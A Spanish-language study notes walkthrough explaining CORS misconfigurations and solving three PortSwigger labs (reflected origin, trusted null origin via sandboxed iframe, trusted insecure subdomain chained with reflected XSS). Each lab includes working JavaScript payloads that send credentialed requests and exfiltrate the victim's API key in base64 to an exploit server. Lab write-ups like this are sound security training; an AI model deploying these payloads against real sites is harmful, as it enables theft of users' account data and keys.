-------
El **Intercambio de recursos de origen cruzado** (**CORS**) es un mecanismo que permite que un servidor web **restrinja** el **acceso a recursos** de **diferentes orígenes**, es decir, de diferentes dominios o protocolos. CORS se utiliza para proteger la privacidad y seguridad de los usuarios al evitar que otros sitios web accedan a información confidencial sin permiso.

Supongamos que tenemos una aplicación web en el dominio “**example.com**” que utiliza una API web en el dominio “**api.example.com**” para recuperar datos. Si la aplicación web está correctamente configurada para CORS, solo permitirá solicitudes de origen cruzado desde el dominio “**example.com**” a la API en el dominio “**api.example.com**“. Si se realiza una solicitud desde un dominio diferente, como “**attacker.com**“, la solicitud será bloqueada por el navegador web.

Sin embargo, si la aplicación web no está correctamente configurada para CORS, un atacante podría aprovecharse de esta debilidad para acceder a recursos y datos confidenciales. Por ejemplo, si la aplicación web no valida la autorización del usuario para acceder a los recursos, un atacante podría inyectar código malicioso en una página web para realizar solicitudes a la API de la aplicación en el dominio “**api.example.com**“.

El atacante podría utilizar herramientas automatizadas para probar diferentes valores de encabezados CORS y encontrar una configuración incorrecta que permita la solicitud desde otro dominio. Si el atacante tiene éxito, podría acceder a recursos y datos confidenciales que no deberían estar disponibles desde su sitio web. Por ejemplo, podría recuperar la información de inicio de sesión de los usuarios, modificar los datos de la aplicación, etc.

Para prevenir este tipo de ataque, es importante configurar adecuadamente CORS en la aplicación web y asegurarse de que solo se permitan solicitudes de origen cruzado desde dominios confiables.

## PortSwigger

### Lab: CORS vulnerability with basic origin reflection

se tiene una configuración de CORS insegura, donde tenemos que obtener la API key  del administrador.
Podemos hacer login con `wiener:peter` :
![[Pasted image 20250915085610.png]]

vemos que al ingresar nos carga la api key, no es inmediata por lo que por seguridad podemos esperar un tiempo antes de obtenerla.

El concepto es que se pueda aprovechar se sesiones activas donde mediante el arrastrar la cookie o lo que sea necesario para mantener la session activa, vamos a realizar acciones como el usuario, en si la mala configuración del CORS lo permite.

Vamos a recargar la web que carga el API Key para capturar y ver que se esta tramitando:
![[Pasted image 20250915090526.png]]

al parecer se tramita una segunda petición a `accountDetails` y vamos a ver su respuesta:
![[Pasted image 20250915090653.png]]

vemos todos los datos de la cuenta en formato JSON, además también vemos en la petición `Access-Control-Allow-Credentials:true` y esto le dice al navegador si exponer la respuesta del código JavaScript, además permite que el navegador envíe cookies, tokens de session u otros datos en la solicitud.

Bueno cuando nosotros creemos la web maliciosa la realizar la petición se debería agregar un encabezado llamado `origin` el cual indica desde donde se tramita la solicitud, no lo vemos en la petición de la captura debido a que al ser del mismo origen no lo necesita, pero podemos intentar agregarlo y ver que sucede:

![[Pasted image 20250915091412.png]]

Vemos que se  agrega en la respuesta y esto es un problema ya que se esta contemplado como que cualquier valor o origen sea valido y esto con el el true del control de acceso se provoca el CORS.

Entonces el código y la idea detrás del mismo será la siguiente:
```html
<script>
  var req = new XMLHttpRequest();
  req.open("GET", "https://0a860017042ab7a080c50d680057007c.web-security-academy.net/my-account/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

La lógica es crear una petición de forma asíncrona a la ruta que nos retorna los datos y para jugar o arrastrar las credenciales validas que se emplean ya almacenadas usamos `withCredentials=true` antes de enviar la solicitud, veamoslo:
![[Pasted image 20250915092410.png]]

![[Pasted image 20250915092635.png]]

parece que funciona, ahora el objetivo es enviarnos estos datos de la respuesta a nosotros, para hacerlo vamos a hacer lo siguiente en nuestro código:
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location = "https://exploit1a9200220415b76580890c0f0185006d.exploit-server.net/?apikey=" + btoa(req.responseText);
  }
  req.open("GET", "https://0a860017042ab7a080c50d680057007c.web-security-academy.net/my-account/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

lo que aumentamos es el  `req.onload` el cual solo se ejecuta luego de cargar la solicitud por completo y mediante una función lo que hacemos es con location enviar una petición al servidor de atacante el contenido de la respuesta en base64.

vemos si esto funciona:
![[Pasted image 20250915093150.png]]

![[Pasted image 20250915100527.png]]
revisando lo logs pues si funciono y ya con esto veámos si se tramita el contenido de nuestro usuario:
![[Pasted image 20250915100659.png]]
Perfecto ahora ya podemos hacer lo mismo para la victima y vemos que obtenemos:
![[Pasted image 20250915100810.png]]
ahora con esto podemos completar la maquina:
![[Pasted image 20250915100846.png]]
Lab Terminado.

### Lab: CORS vulnerability with trusted null origin

El objetivo es el mismo pero al parecer podemos enviar un origen nulo. 

volvemos a capturar peticiones y vemos lo mismo:
![[Pasted image 20250915110738.png]]
el `acces-control-allow-credentials:true` ya nos esta dando un indicio de que podrían acontecerse orígenes cruzados.

vamos a intentar enviar `Origin` a ver que sucede:
![[Pasted image 20250915110928.png]]

No nos refleja el origen en la cabecera por lo que no esta admitiendo cualquier origen así que vamos a intentar con origen nulo a ver que sucede:
![[Pasted image 20250915111045.png]]

Perfecto vemos que si enviamos un origen nulo funciona, ya vemos la cabecera. En este punto tenemos que encontrar la forma de enviar un origen null.

Ahora este origen null no lo podemos definir de forma directa pero con ayuda de `iframe` y un truquito lo podemos hacer. El concepto es sencillo en realidad vamos a juagar con 
el `iframe` y le definimos con un `sandbox` permisos mínimos los cuales solo interprete código JavaScript, luego tenemos algo llamado `srcdoc` el cual nos permite definir contenido dentro del `iframe` y aquí es donde se acontece el null debido a dos conceptos, El contenido dentro de un `srcdock` se considera como un origen único/null por seguridad  además el `sandbox` también impone restricciones que afectan al mismo origen.

Entendiendo eso podemos aprovecharnos para evitar definir el origen null de la siguiente manera:
```html
<iframe sandbox="allow-scripts" srcdoc='<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
  location = "https://exploit-0a92000504b3a86b8294e7ea01350069.exploit-server.net/?apiKey=" + btoa(req.responseText);
  };
  req.open("GET", "https://0a82005b0487a8638271e8fc00c000a3.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();
  </script>'></iframe>
```

como vemos usamos el `sandbox` y el `srcdoc` para enviar un origen null vemos que sucede:
![[Pasted image 20250915113220.png]]
![[Pasted image 20250915113246.png]]

Obtenemos resultado, vemos el contenido:
![[Pasted image 20250915113323.png]]
Perfecto podemos completar el lab.
![[Pasted image 20250915113401.png]]

Lab Terminado.

### Lab: CORS vulnerability with trusted insecure protocols

En este caso se acontece un CORS donde por alguna razón se confía en todos los dominios sin importar el protocolo y de igual forma tenemos que conseguir la `ApiKey` del administrador.

![[Pasted image 20250915114853.png]]

Tanto lo que es origin de otro tipo o nulos no funcionan, nos esta hablando de subdominios, si probamos con el dominio de la misma web veamos que pasa:
![[Pasted image 20250915115010.png]]
Perfecto si es permitido danto http como https, podemos tratar de ver agregando cosas como `https://test....`:
![[Pasted image 20250915115108.png]]
Esto no los permite por lo que por subdominios nos lo permite, entonces tenemos que de alguna forma encontrar algún subdominio.
![[Pasted image 20250915115216.png]]
al verificar por cosas disponibles de la que tenemos vemos que nos envía a otra ventana:
![[Pasted image 20250915115255.png]]

Perfecto, vemos otro dominio, ahora vemos en la url que se maneja por identificador podemos intentar colarle allí una inyección XSS:
![[Pasted image 20250915115542.png]]
lo interpreta y si es completamente vulnerable.

En este punto podemos ver si este dominio nos lo contempla para usarlo en el origin:
![[Pasted image 20250915115644.png]]
Excelente si se contempla.

Con esto vamos a dejar claro el como se va a interactuar, vamos a primero redirigir al usuario a la web donde tenemos la inyección XSS y desde allí con el XSS vamos a realizar la inyección para extraer la `ApiKey` del usuario admin, entonces vemos como queda el código maliciosos de la web:
```html
<script>
document.location = "http://stock.0ac300b9038e41a18141257700b400a9.web-security-academy.net/?productId=%3Cscript%3Evar%20req%20=%20new%20XMLHttpRequest();req.onload%20=%20function%20()%20{location%20=%27https://exploit-0a6c004a031f41c581a924cc01be004e.exploit-server.net/?apiKey=%27%20%2b%20btoa(req.responseText);};req.open(%27GET%27,%20%22https://0ac300b9038e41a18141257700b400a9.web-security-academy.net/accountDetails%22,%20true);req.withCredentials%20=%20true;req.send();%3C/script%3E&storeId=2";
</script>
```

lo que tenemos dentro del location esta url-encode pero seria la inyección de la siguiente manera:
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location =
      'https://exploit-0a6c004a031f41c581a924cc01be004e.exploit-server.net/?apiKey=' + btoa(req.responseText);
  };
  req.open('GET', "https://0ac300b9038e41a18141257700b400a9.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

bueno enviamos esto y vemos que recibimos la petición en el lob:
![[Pasted image 20250915122549.png]]
![[Pasted image 20250915122556.png]]
Lo decifrámos y vemos lo siguiente:
![[Pasted image 20250915122628.png]]
Completamos la maquina:
![[Pasted image 20250915122652.png]]

Lab Terminado.